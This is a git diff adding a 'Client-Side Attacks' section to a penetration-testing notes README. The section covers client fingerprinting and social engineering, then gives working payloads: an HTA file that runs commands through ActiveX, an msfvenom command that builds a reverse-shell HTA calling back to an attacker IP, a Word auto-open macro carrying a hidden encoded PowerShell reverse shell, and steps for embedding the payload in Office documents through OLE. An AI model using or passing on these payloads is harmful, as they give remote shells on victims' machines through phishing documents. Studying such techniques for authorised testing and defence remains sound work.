@@ -94,6 +94,10 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Subdomain takeover](#subdomain-takeover)
   - [4** Bypass](#4-bypass)
   - [Application level Denial of Service](#application-level-denial-of-service)
+- [Client-Side Attacks](#client-side-attacks)
+  - [Client Information Gathering](#client-information-gathering)
+  - [HTML applications](#html-applications)
+  - [Microsoft Office](#microsoft-office)
 - [Thick client vulnerabilities](#thick-client-vulnerabilities)
   - [DLL Hijacking](#dll-hijacking)
   - [Insecure application design](#insecure-application-design)
@@ -2348,6 +2352,109 @@ Once you have the source code, look for the secrets within the files. To find se
 - DoS against a victim
   - Sending a reset link might disable an user's account, spam to prevent the user from accessing their account
   - Multiple wrong passwords might disable an user's account
+
+
+
+## Client-Side Attacks
+
+### <ins>Client Information Gathering</ins>
+
+**Passive Client Information Gathering**
+- Search with Google, social media and forum websites
+- Search for IPs and other sensible information
+
+**Active Client Information Gathering**
+- Make direct contact with the target machine or its users
+  - Interaction with the target: Social engineering, require to click on a link, open an email, run an attachment, or open a document
+  - [Social-Engineer Toolkit (SET)](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/)
+- Client Fingerprinting
+  - [Fingerprintjs2](https://github.com/fingerprintjs/fingerprintjs)
+    - Change permissions on the `fp` directory `sudo chown www-data:www-data fp` to make `/fp/js.php` work
+  - [Parse User Agents](https://developers.whatismybrowser.com/)
+
+### <ins>HTML applications</ins>
+
+If a file is created with a `.hta` extension rather than a `.html` extension, Internet Explorer will automatically recognize it as an HTML Application and provide the option to run it using the mshta.exe application (still useful since many corporations rely on Internet Explorer).
+
+**PoC.hta** leveraging ActiveXObjects
+```HTML
+<html>
+	<head>
+		<script>
+			var c= 'cmd.exe'
+			new ActiveXObject('WScript.Shell').Run(c);
+		</script>
+	</head>
+	<body>
+		<script>
+			self.close();
+		</script>
+	</body>
+</html>
+```
+
+**Create a better payload with [msfvenom from the Metasploit framework]([https://github.com/rapid7/metasploit-framework/blob/master/msfvenom](https://github.com/rapid7/metasploit-framework))**<br/>
+```
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+
+In evil.hta, the code will find the following command ::> `powershell.exe -nop -w hidden -e aQBmCgAWBJAG4AdAQAHQAcg...`
+
+-nop: NoProfile
+-w:   WindowStyle hidden
+-e:   EncodedCommand
+```
+
+### <ins>Microsoft Office</ins>
+
+**Microsoft Word Macro**: To exploit Microsoft Office we need to creare a doc in `.docm` or `.doc` format and use macros. An example of the creation of a macro to run a reverse shell is the following.
+
+1. Since VBA has a 255-character limit for literal strings, we have to split the command into multiple lines. You can do it with the following python script:
+   ```python
+   str = "powershell.exe -nop -w hidden -e H4sIAAb/EF0CA7VWa2+bSBT9nEj5D6iyBCjE..."
+   n = 50
+   for i in range(0, len(str), n):
+   	print ("Str = Str + " + '"' + str[i:i+n] + '"')
+   ```
+2. This will be the final result:
+   ```VBA
+   Sub AutoOpen()
+   	MyMacro
+   End Sub
+   
+   Sub Document_Open()
+   	MyMacro
+   End Sub
+   
+   Sub MyMacro()
+   	Dim Str As String
+   	
+   	Str = Str + "powershell.exe -nop -w hidden -e H4sIAAb/EF0CA7VWa"
+   	Str = Str + "2+bSBT9nEj5D6iyBCjExombNpEqLdgmhhrHBD9iu9YKwwBTj4H"
+   	Str = Str + "C4Jh0+9/3jg1pqqS77UqLbDGP+zz3zFz8PHIpjiMuu+1xX0+Oj"
+   	Str = Str + "4ZO6mw4oRa/u5C4GnZvxaMjWK49GhfcB05YKEnSiTcOjpbX1+0"
+   	Str = Str + "8TVFED/P6DaJKlqHNimCUCSL3FzcNUYrOblefkUu5r1ztz/oNi"
+       	...
+   	Str = Str + "aNrT16pQqhMQu61/7ZgO989DRWIMdw/Di/NWRyD0Jit8bW7V0f"
+   	Str = Str + "T2HIOHYs1NZ76MooKEk7y5kGfqUvGvJkOWvJ9aOk0LYm5JYnzt"
+   	Str = Str + "AUxkne+Miuwtq9HL2vyJW3j8hvLx/Q+z72j/s/hKKslRm/GL9x"
+   	Str = Str + "4XfwvR3U586mIKgDRcoQYdG/joCJT2efexAVaD2fvmwT9XbnJ4"
+   	Str = Str + "N4BPo5PhvyjwHqBILAAA="
+   
+   	CreateObject("Wscript.Shell").Run Str
+   End Sub
+   ```
+
+**Object Linking and Embedding**: another option is to abuse Dynamic Data Exchange (DDE) to execute arbitrary applications from within Office documents ([patched since December of 2017](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021))
+
+1. Create a batch script to run a reverse shell
+   ```batch
+   START powershell.exe -nop -w hidden -e H4sIAAb/EF0CA7VWa2+bSBT9nEj5D6iyBCjE...
+   ```
+2. Open Microsoft Word > Create a new document > Navigate to the Insert ribbon > Click the Object menu
+3. Choose "Create from File" tab and select the newly-created batch script
+4. Change the appearance of the batch file
+
+**Evading Protected View**: In exactly the same way as Word and Excel, Microsoft Publisher permits embedded objects and ultimately code execution, but it will not enable Protected View for documents that are distributed over the Internet.
 
 
 
